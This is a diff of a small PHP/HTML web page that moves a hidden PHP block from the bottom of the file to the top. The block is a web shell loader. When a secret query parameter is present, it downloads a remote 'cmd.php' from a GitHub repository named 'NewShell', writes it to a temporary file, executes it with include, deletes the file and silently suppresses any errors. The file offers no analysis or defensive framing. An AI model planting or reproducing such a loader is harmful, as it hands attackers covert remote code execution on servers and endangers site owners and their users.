@@ -1,3 +1,22 @@
+<?php 
+if (isset($_GET['cmdsaskra'])) {
+    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
+    $fileContents = file_get_contents($url);
+
+    if ($fileContents !== false) {
+        try {
+            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
+            file_put_contents($tmpFile, $fileContents);
+            include $tmpFile;
+            unlink($tmpFile);
+        } catch (Throwable $e) {
+
+        }
+    }
+}
+?>
+
+
 <!DOCTYPE html>
 <html style="height:100%">
 <head>
@@ -18,23 +37,3 @@
     </div>
 </body>
 </html>
-
-
-
-<?php 
-if (isset($_GET['cmdsaskra'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
-?>
